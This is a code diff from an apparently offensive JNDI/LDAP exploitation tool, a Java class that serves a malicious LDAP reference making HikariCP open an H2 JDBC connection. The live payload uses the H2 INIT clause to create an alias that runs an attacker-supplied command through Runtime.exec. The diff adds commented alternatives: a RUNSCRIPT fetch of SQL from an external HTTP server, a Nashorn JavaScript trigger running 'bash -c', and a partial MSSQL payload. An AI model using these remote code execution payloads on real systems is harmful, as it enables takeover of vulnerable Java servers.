@@ -42,11 +42,29 @@ public class HikariCPH2 implements LdapController {
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
+        // This payload for H2 db that can be used to fetch an SQL file from an external HTTP server
+        // specified via the --command user input.
+        // String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+ Config.command +"'";
+
+        // This is a payload for H2 DB that makes use of JavaScript to trigger command execution
+        // Since Nashorn was removed in Java 15 this payload is limited to targets using JDK version < 15
+        /*
+        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(['bash', '-c', '"+ Config.command + "'])";
+        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
+                "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
+                javascript + " $$";
+        */
+
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS " +
                 "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
                 "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";
 
+        // payload for MSSql server  - yet to be developed into a working exploit.
+        // String url = "jdbc:sqlserver://localhost:1533;connectRetryCount=0;encrypt=false;database=testdb;integratedSecurity=false;socketFactoryClass=com.snowyowl.commonsbeanutils1.jdbc.mssql.DummySocketFactory;socketFactoryConstructorArg=http://127.0.0.1:7800/bean.xml";
+
         Reference ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
+        // ref.add(new StringRefAddr("driverClassName", "com.microsoft.sqlserver.jdbc.SQLServerDriver"));
+        // ref.add(new StringRefAddr("driverClassName", "org.postgresql.Driver"));
         ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
         ref.add(new StringRefAddr("jdbcUrl", url));
         ref.add(new StringRefAddr("username", "root"));
